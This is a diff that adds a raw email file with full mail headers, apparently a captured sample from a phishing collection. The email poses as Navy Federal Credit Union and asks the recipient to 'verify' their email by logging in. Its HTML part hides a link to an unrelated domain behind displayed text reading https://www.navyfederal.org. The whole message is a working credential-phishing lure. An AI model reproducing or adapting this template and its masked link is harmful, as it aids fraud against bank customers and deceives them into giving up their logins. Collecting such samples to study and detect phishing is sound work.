@@ -1,0 +1,67 @@
+Return-Path: info@mynfcu.org
+Delivered-To: jose@monkey.org
+X-FDA: 70821491832.01.twig01_6844f663f3040
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=unknown (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 64,4,0,f28a39bef5f88377,d41d8cd98f00b204,info@mynfcu.org,:info@mynfcu.org,RULES_HIT:41:72:355:379:455:581:962:967:973:979:983:988:989:1189:1208:1221:1260:1261:1263:1313:1314:1345:1381:1431:1432:1436:1437:1516:1517:1518:1534:1539:1546:1561:1575:1588:1592:1594:1711:1714:1730:1749:1777:1792:2067:2069:2070:2198:2199:2525:2538:2560:2565:2682:2685:2859:2890:2894:2902:2909:2933:2937:2939:2942:2945:2947:2951:2954:3022:3040:3138:3139:3140:3141:3142:3690:3867:3868:3871:3873:3889:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4383:4552:5007:6678:6687:8599:9025:9388:10011:10400:11658:11914:12043:12477:12515:12520:12561:12776:13132:13231:13236:14037:14094:14129:14596:14651:21080:30001:30012:30022:30026:30054:30055:30064:30067:30069:30070:30075,0,RBL:error,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:ff,MSBL:0,DNSBL:neutral,Custom_rules:0:2:0,LFtime:74,LUA_SUMMARY:none
+X-HE-Tag: twig01_6844f663f3040
+X-Filterd-Recvd-Size: 2321
+Received: from LPD-RDS01.LPD.local (rrcs-76-79-47-130.west.biz.rr.com [76.79.47.130])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu,  5 Nov 2015 19:11:56 +0000 (UTC)
+Received: from LPD-RDS01.LPD.local ([127.0.0.1]) by LPD-RDS01.LPD.local over TLS secured channel with Microsoft SMTPSVC(7.5.7601.17514);
+	 Thu, 5 Nov 2015 13:11:49 -0600
+Content-Type: multipart/alternative; boundary="===============0409755490=="
+MIME-Version: 1.0
+Subject: Your Account Email Verification Code
+To: Recipients <info@mynfcu.org>
+From: "Navy Federal Credit Union" <info@mynfcu.org>
+Date: Thu, 05 Nov 2015 13:11:47 -0600
+Return-Path: info@mynfcu.org
+Message-ID: <LPD-RDS01msSVhGOD6g000001ff@LPD-RDS01.LPD.local>
+X-OriginalArrivalTime: 05 Nov 2015 19:11:49.0018 (UTC) FILETIME=[D223C7A0:01D117FD]
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 238
+
+You will not see this in a MIME-aware mail reader.
+--===============0409755490==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+ For security reasons we are verifying and confirming our customers emails =
+on our database.
+ This is your account email verification code
+ =
+
+MKGO019
+
+ Login here https://www.navyfederal.org go to your account settings to ente=
+r your verification
+ Thank you for your co-operation.
+ Copyright 2015 Navy Federal Credit Union.
+
+--===============0409755490==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><img src=3D"http://navyfederal.org/images/structure/=
+nfculogo.png" alt=3D"link.com" border=3D"0" height=3D"72" width=3D"262"><br>
+<p>For security reasons we are verifying and confirming our customers email=
+s on our database.</p>
+<p>This is your account email verification code</p>
+<p><h1>MKGO019</h1></p>
+<p>Login here <a href=3D"http://codelaertnfcu.granvillensw2142.org/com.htm"=
+ target=3D"_blank">https://www.navyfederal.org</a> go to your account setti=
+ngs to enter your verification</p>
+<p>Thank you for your co-operation.</p>
+<p>Copyright 2015 Navy Federal Credit Union.</p></html>
+--===============0409755490==--
